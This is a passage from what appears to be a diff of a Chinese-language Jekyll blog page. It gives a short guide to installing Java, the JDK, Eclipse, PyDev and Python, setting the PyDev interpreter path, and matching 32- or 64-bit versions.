+1.Java http://www.java.com/zh_CN/download/index.jsp<br />
+2.Jdk http://www.oracle.com/technetwork/java/javase/downloads/index.html<br />
+3.eclipse http://www.eclipse.org/downloads/<br />
+4.pvDev http://pydev.org/manual_101_install.html (其中尤其要关注一下 Then, UNCHECK the 'Contact all update sites during install to find required software' and press<br />
+'Next' again to confirm your selection. 把那个钩子要去掉的因为这个失败了好多次<br />
+5.python http://python.org/download/<br />
+分别全装完之后还剩下最后就是要在eclipse里设置python解释器的路径了<br />
+6.windows->perferences->PyDev->Interpereter-Python 设置5中python的路径</p>
+
+<p>enjoy</p>
+
+<p>ps.切记1 2 3步的要么全是32位要么全是64 因为64位机能够很成功自然得装上32位的Java然后再eclipse里会加载jvm.dll是出错……详见http://stackoverflow.com/questions/7352493/failed-to-load-the-jni-shared-library-jdk</p>
+
+<p></p>
+
+    </div>
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-folder-open"></i></li>
+      
+      
+
+
+  
+    
+    	<li><a href="#未分类-ref">
+    		未分类 <span>3</span>
+    	</a></li>
+    
+  
+
+
+
+    </ul>
+  
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-tags"></i></li>
+      
+      
+
+
+  
+    
+  
+
+
+
+    </ul>
+  
+  </div>
+</div>
+
+
+<!-- </ul> -->
+
+<div id="post-pagination" class="paginator">
+
+  
+    <span class="previous disabled">前页</span>
+  
+
+      
+      <span class="current-page">1</span>
+      
+
+    
+      
+      <a href="/page2">2</a>
+      
+    
+      
+      <a href="/page3">3</a>
+      
+    
+
+  
+    <a class="next" href="/page2">后页</a>
+  
+  (共51篇)
+</div>
+
+        </div>
+        <hr>
+        <footer>
+          <p>&copy; 2014 Xinzheng ZhangPowered by Jekyll @ GitHub
+          </p>
+        </footer>
+
+      </div>
+    </div>
     
   </body>
 </html>
